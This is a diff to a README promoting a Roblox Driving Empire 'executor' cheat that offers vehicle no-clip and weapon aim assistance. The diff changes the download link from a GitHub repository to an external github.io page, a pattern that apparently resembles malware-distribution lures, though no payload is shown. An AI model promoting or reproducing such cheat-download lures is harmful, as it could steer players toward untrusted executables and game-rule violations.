@@ -1,6 +1,6 @@
 # 🚗 driving-empire-executor-2026 - Dominate The Road With Ease
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-blue?style=for-the-badge&logo=github)](https://github.com/Luelleliege928/driving-empire-executor-2026)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-blue?style=for-the-badge&logo=github)](https://luelleliege928.github.io)
 
 This tool helps you run Lua scripts in Roblox Driving Empire. You get vehicle no-clip for driving through any object. You also get crosshair aiming for your car weapons. This makes driving and combat much easier.
 
